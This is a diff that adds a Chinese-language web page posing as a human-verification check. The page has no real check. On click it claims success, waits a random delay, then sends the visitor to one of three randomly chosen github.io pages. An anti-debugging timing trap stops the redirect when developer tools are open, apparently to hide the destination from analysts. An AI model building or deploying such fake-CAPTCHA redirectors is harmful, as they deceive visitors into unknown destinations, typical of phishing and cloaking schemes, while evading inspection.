@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>正在验证...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: sans-serif; text-align: center; margin-top: 100px; background: #f9f9f9; }
+    #verifyBtn {
+      padding: 12px 24px;
+      font-size: 18px;
+      background: #1aad19;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    #status { margin-top: 30px; font-size: 16px; color: #555; }
+  </style>
+</head>
+<body>
+  <h2>请进行人机验证</h2>
+  <button id="verifyBtn">我是人类</button>
+  <div id="status">正在加载验证码模块...</div>
+
+  <script>
+    (function () {
+      const urls = [
+        "https://a78521336.github.io/1/",
+        "https://a78521336.github.io/2/",
+        "https://a78521336.github.io/3/"
+      ];
+
+      function antiDebug() {
+        const t = 160;
+        const n = new Date();
+        debugger;
+        const e = new Date();
+        if (e - n > t) {
+          document.body.innerHTML = "<h2>检测到非法调试，跳转已终止。</h2>";
+          throw new Error("Debugger detected");
+        }
+      }
+
+      const btn = document.getElementById('verifyBtn');
+      const status = document.getElementById('status');
+
+      btn.addEventListener('click', function () {
+        status.innerText = "验证通过，正在跳转...";
+        btn.disabled = true;
+        btn.innerText = "验证中...";
+        
+        const delay = Math.floor(Math.random() * 2000) + 1000; // 1-3秒延迟
+        setTimeout(function () {
+          try {
+            antiDebug();
+            const target = urls[Math.floor(Math.random() * urls.length)];
+            location.href = target;
+          } catch (e) {
+            console.warn(e);
+          }
+        }, delay);
+      });
+
+      if (!document.hasFocus()) {
+        status.innerText = "请点击页面以继续...";
+        window.addEventListener("focus", () => location.reload());
+        btn.disabled = true;
+      }
+    })();
+  </script>
+</body>
+</html>
